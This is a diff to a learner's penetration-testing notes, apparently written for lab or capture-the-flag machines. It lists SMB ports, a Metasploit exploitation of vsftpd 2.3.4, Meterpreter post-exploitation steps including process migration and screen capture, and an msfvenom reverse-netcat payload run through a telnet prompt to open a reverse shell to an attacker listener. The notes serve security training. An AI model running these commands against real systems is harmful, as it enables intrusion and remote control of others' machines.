@@ -121,8 +121,10 @@ Or Metasploit
 TCP port 445: This is the primary port used by SMB for file sharing and
 communication. It handles the majority of SMB traffic, including file access,
 printer sharing, and remote administration
+
 UDP ports 137 and 138: These ports are used by SMB for NetBIOS name
 resolution and datagram services, similar to NetBIOS
+
 TCP port 139: This port is used by older versions of SMB for session
 establishment and file sharing. It is commonly used in conjunction with
 NetBIOS over TCP/IP (NBT)
@@ -165,7 +167,7 @@ The Meterpreter can be used to perform different actions on the machine which in
 `>searchsploit vsftpd 2.3.4 (from nmap –A –sC 192.168.1.2 things running on ports)`
 OR Nessus GUI Do a scan
 
-# Exploitation
+# Exploitation (following assessment)
 ```
 >sudo msfconsole
 >search vsftp
@@ -173,6 +175,7 @@ OR Nessus GUI Do a scan
 >show options
 >set RHOSTS 192.168.1.2 (target)
 >exploit
+This should give shell
 >whoami, ps, cd etc
 ```
 
@@ -186,8 +189,8 @@ OR Nessus GUI Do a scan
 >exploit
 >ps (processes)
 >help (shows options to post exploit)
->ps - get id of explorer.exe 
->migrate XXXX
+>ps - get id of explorer.exe (or something running as system)
+>migrate XXXX 
 >screenshot
 >getui
 >screenshare
@@ -223,13 +226,21 @@ To get an rsa key to work chmod 600 id_rsa
 ```
 >nmap –sS –T4 ‐p‐ 10.10.50.26   (normally port 23)
 >telnet $IP $PORT
+>.HELP (to view commands
+
+--Attacker machine--
+>sudo tcpdump ip proto //icmp -i tun0
+
+--Telnet prompt--
+.RUN ping {attacker IP} -c 1
+
 —new tab—-
 >msfvenom -l payloads | grep netcat
 >msfvenom -p cmd/unix/reverse_netcat LHOST=10.8.64.134 LPORT=444
 Copy generated payload
 >nc -lnvp 444 (to listen for the reverse shell)
 —-
-On target machine 
+On target machine through telnet prompt
 >.RUN {generated payload}
 —-
 Back on reverse shell listener
